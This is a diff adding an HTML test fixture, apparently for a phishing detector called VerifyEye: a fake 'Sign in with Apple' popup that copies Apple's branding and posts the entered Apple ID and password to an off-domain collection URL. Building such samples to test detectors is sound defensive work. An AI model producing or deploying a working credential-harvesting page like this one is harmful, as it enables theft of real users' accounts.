@@ -1,0 +1,48 @@
+<!doctype html>
+<!-- LOCAL TEST FIXTURE ONLY — never deployed. Fake "Sign in with Apple" popup.
+     The window a phishing page opens when the victim clicks "Continue with Apple".
+     Impersonates Apple ID on a non-apple.com host and posts credentials off-domain,
+     so VerifyEye freezes it the moment it opens. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in with Apple ID</title>
+  <style>
+    :root { --a-text: #1d1d1f; --a-sub: #6e6e73; --a-border: #d2d2d7; --a-blue: #0071e3; }
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: -apple-system, "SF Pro Text", Helvetica, Arial, sans-serif; color: var(--a-text); background: #fff; display: grid; place-items: center; min-height: 100vh; }
+    .card { width: 100%; max-width: 360px; padding: 40px 32px; text-align: center; }
+    .logo { width: 44px; height: 44px; margin: 0 auto 14px; display: block; fill: var(--a-text); }
+    h1 { font-size: 22px; font-weight: 600; margin: 0 0 4px; }
+    .sub { font-size: 15px; color: var(--a-sub); margin: 0 0 28px; }
+    .stack { border: 1px solid var(--a-border); border-radius: 12px; overflow: hidden; margin-bottom: 20px; }
+    .stack input { width: 100%; height: 48px; padding: 0 16px; font-size: 16px; border: 0; outline: none; }
+    .stack input:first-child { border-bottom: 1px solid var(--a-border); }
+    .stack input:focus { background: #f5f5f7; }
+    .keep { display: flex; align-items: center; gap: 8px; font-size: 14px; color: var(--a-sub); margin-bottom: 24px; }
+    .next { width: 100%; height: 46px; background: var(--a-blue); color: #fff; border: 0; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; }
+    .links { margin-top: 22px; font-size: 13px; }
+    .links a { color: var(--a-blue); text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <svg class="logo" viewBox="0 0 24 24" aria-hidden="true"><path d="M16.3 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.9-3.5.9-.7 0-1.9-.8-3-.8-1.5 0-3 .9-3.8 2.3-1.6 2.8-.4 7 1.2 9.3.8 1.1 1.7 2.4 2.9 2.3 1.2 0 1.6-.8 3-.8s1.8.8 3 .7c1.2 0 2-1.1 2.8-2.2.9-1.3 1.2-2.5 1.3-2.6-.1 0-2.5-1-2.5-3.9zM14 5.4c.6-.8 1.1-1.8.9-2.9-.9.1-2 .6-2.6 1.4-.6.7-1.1 1.8-1 2.8 1 .1 2-.5 2.7-1.3z"/></svg>
+    <h1>Sign in with Apple ID</h1>
+    <p class="sub">Use your Apple ID to continue</p>
+
+    <!-- off-domain action is the phishing signal VerifyEye reads -->
+    <form action="https://apple-id-verify.com/collect" method="post">
+      <div class="stack">
+        <input name="appleid" type="email" autocomplete="username" placeholder="Apple ID" required />
+        <input name="password" type="password" autocomplete="current-password" placeholder="Password" required />
+      </div>
+      <label class="keep"><input type="checkbox" /> Keep me signed in</label>
+      <button class="next" type="submit">Sign In</button>
+    </form>
+
+    <p class="links"><a href="#">Forgot Apple ID or password?</a></p>
+  </div>
+</body>
+</html>
